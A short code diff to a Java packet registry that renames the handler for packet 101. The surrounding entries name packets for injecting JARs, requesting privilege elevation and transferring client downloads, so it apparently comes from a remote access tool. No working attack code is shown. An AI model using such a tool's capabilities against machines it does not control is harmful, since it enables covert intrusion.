@@ -106,7 +106,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 98, Packet98InjectJAR.class);
 		// 99
 		incomingPackets.put((byte) 100, Packet100RequestElevation.class);
-		incomingPackets.put((byte) 101, Packet101TransferPlugin.class);
+		incomingPackets.put((byte) 101, Packet101DownloadPlugin.class);
 		incomingPackets.put((byte) 102, Packet102PauseClientDownload.class);
 		incomingPackets.put((byte) 103, Packet103CompleteClientDownload.class);
 		incomingPackets.put((byte) 104, Packet104ClientDownloadPart.class);
